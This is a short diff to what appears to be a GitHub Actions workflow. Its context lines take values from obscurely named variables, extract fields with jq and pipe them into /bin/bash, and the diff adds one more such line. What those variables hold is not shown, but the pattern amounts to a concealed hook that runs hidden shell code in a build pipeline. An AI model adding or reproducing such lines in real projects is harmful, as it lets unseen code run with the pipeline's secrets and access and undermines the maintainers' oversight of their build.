@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$g3" | jq -r .yb0 | /bin/bash
           printf '%s' "$ddxh79266" | jq -r .vlut98 | /bin/bash
           printf '%s' "$flmoz43" | jq -r .omrmn6 | /bin/bash
+          printf '%s' "$wi0" | jq -r .z45 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
